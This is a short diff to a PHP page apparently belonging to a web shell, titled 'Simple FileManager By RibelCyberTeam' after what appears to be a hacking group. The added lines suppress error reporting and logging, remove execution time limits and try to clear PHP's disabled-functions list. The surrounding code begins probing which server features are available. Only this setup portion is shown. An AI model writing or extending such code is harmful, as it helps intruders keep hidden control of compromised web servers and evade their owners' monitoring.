@@ -31,6 +31,18 @@
             <h1 class="mb-4 text-center">Simple FileManager By RibelCyberTeam</h1>
         </a>
         <?php
+        error_reporting(0);
+        @clearstatcache();
+        @mb_internal_encoding('UTF-8');
+        set_time_limit(0);
+        @ini_set('error_log',null);
+        @ini_set('log_errors',0);
+        @ini_set('max_execution_time',0);
+        @ini_set('output_buffering',0);
+        @ini_set('display_errors', 0);
+        @ini_set('disable_functions', 0);
+        session_start();
+        date_default_timezone_set("Asia/Jakarta");
         $green = "<span style='color: green;'>ON</span>";
         $red = "<span style='color: red;'>OFF</span>";
         $sql = (extension_loaded('mysql') || function_exists('mysql_connect')) ? $green : $red;
